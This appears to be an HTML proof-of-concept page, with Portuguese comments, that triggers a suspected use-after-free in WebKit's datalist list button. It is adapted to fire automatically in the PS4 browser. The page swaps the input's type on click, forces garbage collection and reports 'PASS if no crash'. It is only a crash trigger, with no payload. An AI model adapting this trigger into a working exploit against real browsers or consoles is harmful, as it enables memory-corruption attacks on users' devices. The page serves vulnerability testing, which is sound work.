<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
<style>
body { font-family: sans-serif; padding: 20px; }
input { width: 300px; height: 50px; font-size: 20px; }
</style>
</head>
<body>
<h2>Teste DataListButton UAF - PS4 Forçado</h2>
<p>Toque no botão abaixo para disparar a mutação do input:</p>

<input id="input" type="text" list="list">
<datalist id="list">
    <option value="a">
    <option value="b">
</datalist>

<div id="result" style="margin-top: 20px; font-weight: bold;"></div>

<script>
function gc() {
    if (typeof GCController !== "undefined") {
        GCController.collect();
    } else {
        var gcRec = function (n) {
            if (n < 1) return {};
            var temp = {i: "ab" + i + (i / 100000)};
            temp += "foo";
            gcRec(n-1);
        };
        for (var i = 0; i < 1000; i++)
            gcRec(10);
    }
}

window.addEventListener('load', () => {
    const input = document.getElementById('input');
    const result = document.getElementById('result');

    input.addEventListener('click', (e) => {
        // Altera o tipo para 'button' no clique para destruir o TextFieldInputType
        input.type = 'button';
        gc();
        result.innerHTML = '<span style="color: green;">PASS if no crash.</span>';
    }, { once: true });

    input.focus();

    // No PS4, se o shadowRoot estiver oculto, forçamos o disparo simulando 
    // um evento customizado diretamente na camada de controle do elemento.
    setTimeout(() => {
        try {
            // Tenta acessar via API interna caso o firmware do PS4 permita em modo debug
            if (window.internals) {
                let shadow = internals.shadowRoot(input);
                let listButton = shadow.querySelector("div[useragentpart='-webkit-list-button']");
                if (listButton) {
                    listButton.click();
                    return;
                }
            }
        } catch (e) {}

        // Fallback robusto: cria um elemento espelho simulando o gatilho interno 
        // e força o evento de clique com bolha para o input processar a mudança de tipo
        const simulatedEvent = new MouseEvent('click', {
            bubbles: true,
            cancelable: true,
            view: window
        });
        
        // Dispara diretamente no input simulando a origem do botão de lista
        input.dispatchEvent(simulatedEvent);
    }, 500);
});
</script>
</body>
</html>
